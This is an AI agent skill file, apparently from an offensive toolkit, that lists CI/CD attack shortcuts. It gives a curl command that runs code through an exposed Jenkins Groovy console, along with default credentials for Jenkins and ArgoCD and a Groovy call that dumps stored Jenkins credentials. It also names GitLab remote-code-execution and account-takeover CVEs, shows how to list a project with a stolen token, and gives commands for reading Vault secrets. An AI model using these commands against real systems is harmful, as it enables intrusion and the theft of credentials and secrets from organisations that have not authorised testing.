---
name: svc-cicd
description: CI/CD gotchas — default creds, instant-RCE paths, secret leaks in logs. Use when a CI/CD service is found. Triggers - Jenkins, GitLab, ArgoCD, Vault, pipeline, runner token.
---

# CI/CD — Gotchas & Quick Wins

## Jenkins = RCE if /script is open
`curl -d 'script=println+"id".execute().text' http://TARGET:8080/script`
No auth needed if Groovy console is exposed. Check `/script` FIRST.
Default creds: `admin/admin`, `admin/password`, `admin/jenkins`.
Credential extraction (authenticated): Groovy → `SystemCredentialsProvider.getInstance().getCredentials()`.

## GitLab — version-dependent RCE
- **CVE-2021-22205** (11.9–13.10.3): RCE via image upload (ExifTool)
- **CVE-2023-7028**: Account takeover via password reset
Check version: `curl -s TARGET/api/v4/version`
Stolen API token → `curl -H "PRIVATE-TOKEN: ..." .../api/v4/projects?membership=true` → repos/snippets for secrets.

## ArgoCD default creds
Default: `admin` / pod name (`argocd-server-<hash>`). Often unchanged.

## Vault — check seal status first
`curl TARGET:8200/v1/sys/health` — unsealed + initialized = live secrets.
With root token: `curl -H "X-Vault-Token: ..." TARGET:8200/v1/secret/data/`

## Where secrets leak
- Build/pipeline logs (plaintext env vars, tokens, passwords)
- `.env`, `docker-compose.yml`, `Jenkinsfile`, `.gitlab-ci.yml` in repos
- Runner/agent tokens in pod environments
- Registry credentials (Docker Hub, ECR, GCR)
